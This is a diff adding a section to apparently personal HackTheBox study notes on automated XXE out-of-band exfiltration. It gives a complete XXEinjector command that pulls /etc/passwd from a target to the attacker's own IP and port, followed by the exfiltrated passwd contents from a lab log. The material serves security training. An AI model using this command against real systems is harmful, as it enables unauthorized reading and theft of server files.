@@ -128,4 +128,15 @@ If everything goes well, we should be able to see the file content
 
 Automated OOB Exfiltration:
 
-We can use XXEInjector to perform Automated OOB Exfiltration https://github.com/enjoiz/XXEinjector, after cloning it, we copy the HTTP request from burp and write it to a file, below is the description of how to use this tool a
+We can use XXEInjector to perform Automated OOB Exfiltration https://github.com/enjoiz/XXEinjector, after cloning it, we copy the HTTP request from burp and write it to a file, below is the description of how to use this tool at HTB:
+Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
+`Avalon112@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter  ...SNIP... [+] Sending request with malicious XML. [+] Responding with XML for: /etc/passwd [+] Retrieved data:`
+
+All retrieved files are stored at logs folder under the tool:
+```
+cat Logs/10.129.201.94/etc/passwd.log 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP..
+```
